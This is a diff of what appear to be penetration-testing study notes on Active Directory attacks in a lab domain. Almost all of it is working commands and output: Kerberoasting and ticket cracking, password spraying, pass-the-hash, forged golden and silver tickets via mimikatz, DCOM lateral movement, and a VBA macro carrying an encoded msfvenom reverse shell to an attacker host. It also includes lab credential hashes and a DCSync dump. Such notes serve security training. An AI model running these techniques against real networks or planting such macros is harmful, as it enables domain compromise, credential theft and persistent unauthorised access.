@@ -515,11 +515,6 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 ```
 
 ```
-```
-
-{% tabs %}
-{% tab title="klist" %}
-```
 PS C:\Users\offsec.CORP> klist
 
 Current LogonId is 0:0x3dedf
@@ -549,10 +544,8 @@ Cached Tickets: (4)
 	Kdc Called: DC01.corp.com
 ...
 ```
-{% endtab %}
 
-{% tab title="mimikatz" %}
-
+or using mimikatz :
 
 ```
 mimikatz # kerberos::list /export
@@ -571,18 +564,412 @@ mimikatz # kerberos::list /export
    Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;
    \* Saved to file     : 1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
 ```
-{% endtab %}
-{% endtabs %}
 
-\
-\
-\
-\
+cracking
 
+```
+kali@kali:~$ sudo apt update && sudo apt install kerberoast
+...
+kali@kali:~$ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi 
+found password for ticket 0: Qwerty09!  File: 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
+All tickets cracked!
+```
 
-\
-\
+can also use john
 
+#### Low and Slow Password Guessing
+
+```
+PS C:\Users\Offsec.corp> net accounts
+Force user logoff how long after time expires?:       Never
+Minimum password age (days):                          0
+Maximum password age (days):                          42
+Minimum password length:                              0
+Length of password history maintained:                None
+Lockout threshold:                                    5
+Lockout duration (minutes):                           30
+Lockout observation window (minutes):                 30
+Computer role:                                        WORKSTATION
+The command completed successfully.
+```
+
+```powershell
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://"
+$SearchString += $PDC + "/"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$SearchString += $DistinguishedName
+New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qwerty09!")
+```
+
+If the password for the user account is correct, the object creation will be successful as shown in:w
+
+```
+distinguishedName : {DC=corp,DC=com}
+Path              : LDAP://DC01.corp.com/DC=corp,DC=com
+```
+
+```
+PS C:\Tools\active_directory> .\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
+WARNING: also targeting admin accounts.
+Performing brute force - press [q] to stop the process and print results...
+Guessed password for user: 'Administrator' = 'Qwerty09!'
+Guessed password for user: 'offsec' = 'Qwerty09!'
+Guessed password for user: 'adam' = 'Qwerty09!'
+Guessed password for user: 'iis_service' = 'Qwerty09!'
+Guessed password for user: 'sql_service' = 'Qwerty09!'
+Stopping bruteforce now....
+Users guessed are:
+ 'Administrator' with password: 'Qwerty09!'
+ 'offsec' with password: 'Qwerty09!'
+ 'adam' with password: 'Qwerty09!'
+ 'iis_service' with password: 'Qwerty09!'
+ 'sql_service' with password: 'Qwerty09!'
+```
+
+### Active Directory Lateral Movement
+
+#### Pass the Hash
+
+only works for server or service using NTLM authentication.
+
+```
+kali@kali:~$ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
+E_md4hash wrapper called.
+HASH PASS: Substituting user supplied NTLM HASH...
+Microsoft Windows [Version 10.0.16299.309]
+(c) 2017 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+#### Overpass the Hash
+
+```
+mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
+user    : jeff_admin
+domain  : corp.com
+program : cmd.exe
+impers. : no
+NTLM    : e2b475c11da2a0748290d87aa966c327
+  |  PID  4832
+  |  TID  2268
+  |  LSA Process is now R/W
+  |  LUID 0 ; 1197687 (00000000:00124677)
+  \_ msv1_0   - data copy @ 040E5614 : OK !
+  \_ kerberos - data copy @ 040E5438
+   \_ aes256_hmac       -> null
+   \_ aes128_hmac       -> null
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace -> null
+```
+
+At this point, we have a new PowerShell session that allows us to execute commands as Jeff\_Admin.
+
+```
+PS C:\Windows\system32> net use \\dc01
+The command completed successfully.
+
+PS C:\Windows\system32> klist
+
+Current LogonId is 0:0x1583ae
+
+Cached Tickets: (3)
+
+#0> Client: jeff_admin @ CORP.COM
+    Server: krbtgt/CORP.COM @ CORP.COM
+    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+    Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canoni
+    Start Time: 2/12/2018 13:59:40 (local)
+    End Time:   2/12/2018 23:59:40 (local)
+    Renew Time: 2/19/2018 13:59:40 (local)
+    Session Key Type: AES-256-CTS-HMAC-SHA1-96
+    Cache Flags: 0x2 -> DELEGATION
+    Kdc Called: DC01.corp.com
+
+#1> Client: jeff_admin @ CORP.COM
+    Server: krbtgt/CORP.COM @ CORP.COM
+    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+    Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonica
+    Start Time: 2/12/2018 13:59:40 (local)
+    End Time:   2/12/2018 23:59:40 (local)
+    Renew Time: 2/19/2018 13:59:40 (local)
+    Session Key Type: AES-256-CTS-HMAC-SHA1-96
+    Cache Flags: 0x1 -> PRIMARY
+    Kdc Called: DC01.corp.com
+
+#2> Client: jeff_admin @ CORP.COM
+    Server: cifs/dc01 @ CORP.COM
+    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+    Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_c
+    Start Time: 2/12/2018 13:59:40 (local)
+    End Time:   2/12/2018 23:59:40 (local)
+    Renew Time: 2/19/2018 13:59:40 (local)
+    Session Key Type: AES-256-CTS-HMAC-SHA1-96
+    Cache Flags: 0
+    Kdc Called: DC01.corp.com
+```
+
+Running ./PsExec.exe to launch cmd.exe remotely on the \dc01 machine as Jeff\_Admin:
+
+```
+PS C:\Tools\active_directory> .\PsExec.exe \\dc01 cmd.exe
+```
+
+#### Pass the Ticket
+
+SID
+
+```
+C:\>whoami /user
+
+USER INFORMATION
+----------------
+
+User Name   SID
+=========== ==============================================
+corp\offsec S-1-5-21-1602875587-2787523311-2599479668-1103
+```
+
+The SID defining the domain is the entire string except the RID at the end ( _-1103_ )
+
+```
+mimikatz # kerberos::purge
+Ticket(s) purge for current session is OK
+
+mimikatz # kerberos::list
+
+mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+User      : offsec
+Domain    : corp.com (CORP)
+SID       : S-1-5-21-1602875587-2787523311-2599479668
+User Id   : 500
+Groups Id : \*513 512 520 518 519
+ServiceKey: e2b475c11da2a0748290d87aa966c327 - rc4_hmac_nt
+Service   : HTTP
+Target    : CorpWebServer.corp.com
+Lifetime  : 13/02/2018 10.18.42 ; 11/02/2028 10.18.42 ; 11/02/2028 10.18.42
+-> Ticket : \*\* Pass The Ticket \*\*
+
+ \* PAC generated
+ \* PAC signed
+ \* EncTicketPart generated
+ \* EncTicketPart encrypted
+ \* KrbCred generated
+
+Golden ticket for 'offsec @ corp.com' successfully submitted for current session
+
+mimikatz # kerberos::list
+
+[00000000] - 0x00000017 - rc4_hmac_nt
+   Start/End/MaxRenew: 13/02/2018 10.18.42 ; 11/02/2028 10.18.42 ; 11/02/2028 10.18.42
+   Server Name       : HTTP/CorpWebServer.corp.com @ corp.com
+   Client Name       : offsec @ corp.com
+   Flags 40a00000    : pre_authent ; renewable ; forwardable ;
+```
+
+#### Distributed Component Object Model
+
+Microsoft Office
+
+```
+$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
+$com | Get-Member
+```
+
+proof of concept macro for Excel
+
+```
+Sub mymacro()
+    Shell ("notepad.exe")
+End Sub
+```
+
+We have named the macro "mymacro" and saved the Excel file in the legacy .xls format.
+
+```
+$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
+$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
+[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+```
+
+```
+$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+Unable to get the Open property of the Workbooks class
+At line:1 char:1
++ $Workbook = $com.Workbooks.Open("C:\myexcel.xls")
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OperationStopped: (:) [], COMException
+    + FullyQualifiedErrorId : System.Runtime.InteropServices.COMException
+```
+
+```
+$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+$temp = [system.io.directory]::createDirectory($Path)
+```
+
+```
+$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
+$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
+$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
+[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+$temp = [system.io.directory]::createDirectory($Path)
+$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+$com.Run("mymacro")
+```
+
+rev shell
+
+```
+kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
+```
+
+```
+str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."
+
+n = 50
+
+for i in range(0, len(str), n):
+	print "Str = Str + " + '"' + str[i:i+n] + '"'
+```
+
+```
+Sub MyMacro()
+    Dim Str As String
+    
+    Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
+    Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
+    ...
+    Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
+    Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
+    Shell (Str)
+End Sub
+```
+
+```
+PS C:\Tools\practical_tools> nc.exe -lvnp 4444
+```
+
+### Active Directory Persistence
+
+#### Golden Tickets
+
+```
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::lsa /patch
+Domain : CORP / S-1-5-21-1602875587-2787523311-2599479668
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   :
+NTLM : e2b475c11da2a0748290d87aa966c327
+
+RID  : 000001f5 (501)
+User : Guest
+LM   :
+NTLM :
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   :
+NTLM : 75b60230a2394a812000dbfad8415965
+...
+```
+
+```
+mimikatz # kerberos::purge
+Ticket(s) purge for current session is OK
+
+mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
+User      : fakeuser
+Domain    : corp.com (CORP)
+SID       : S-1-5-21-1602875587-2787523311-2599479668
+User Id   : 500
+Groups Id : \*513 512 520 518 519
+ServiceKey: 75b60230a2394a812000dbfad8415965 - rc4_hmac_nt
+Lifetime  : 14/02/2018 15.08.48 ; 12/02/2028 15.08.48 ; 12/02/2028 15.08.48
+-> Ticket : \*\* Pass The Ticket \*\*
+
+ \* PAC generated
+ \* PAC signed
+ \* EncTicketPart generated
+ \* EncTicketPart encrypted
+ \* KrbCred generated
+
+Golden ticket for 'fakeuser @ corp.com' successfully submitted for current session
+
+mimikatz # misc::cmd
+Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 012E3A24
+```
+
+```
+C:\Users\offsec.corp> psexec.exe \\dc01 cmd.exe
+C:\Windows\system32> whoami
+corp\fakeuser
+```
+
+#### Domain Controller Synchronization
+
+```
+mimikatz # lsadump::dcsync /user:Administrator
+[DC] 'corp.com' will be the domain
+[DC] 'DC01.corp.com' will be the DC server
+[DC] 'Administrator' will be the user account
+
+Object RDN           : Administrator
+
+\*\* SAM ACCOUNT \*\*
+
+SAM Username         : Administrator
+User Principal Name  : Administrator@corp.com
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 05/02/2018 19.33.10
+Object Security ID   : S-1-5-21-1602875587-2787523311-2599479668-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: e2b475c11da2a0748290d87aa966c327
+  ntlm- 0: e2b475c11da2a0748290d87aa966c327
+  lm  - 0: 913b84377b5cb6d210ca519826e7b5f5
+
+Supplemental Credentials:
+\* Primary:NTLM-Strong-NTOWF \*
+  Random Value : f62e88f00dff79bc79f8bad31b3ffa7d
+
+\* Primary:Kerberos-Newer-Keys \*
+  Default Salt : CORP.COMAdministrator
+  Default Iterations : 4096
+  Credentials
+  aes256_hmac (4096): 4c6300b908619dc7a0788da81ae5903c2c97c5160d0d9bed85cfd5af02dabf01
+  aes128_hmac (4096): 85b66d5482fc19858dadd07f1d9b818a
+  des_cbc_md5 (4096): 021c6df8bf07834a
+
+\* Primary:Kerberos \*
+  Default Salt : CORP.COMAdministrator
+  Credentials
+    des_cbc_md5       : 021c6df8bf07834a
+
+\* Packages \*
+  NTLM-Strong-NTOWF
+
+\* Primary:WDigest \*
+  01  4ec8821bb09675db670e66998d2161bf
+  02  3c9be2ff39c36efd2f84b63aa656d09a
+  03  2cf1734936287692601b7e36fc01e2d7
+  04  4ec8821bb09675db670e66998d2161bf
+  05  3c9be2ff39c36efd2f84b63aa656d09a
+...
+```
 
 ## Networking
 
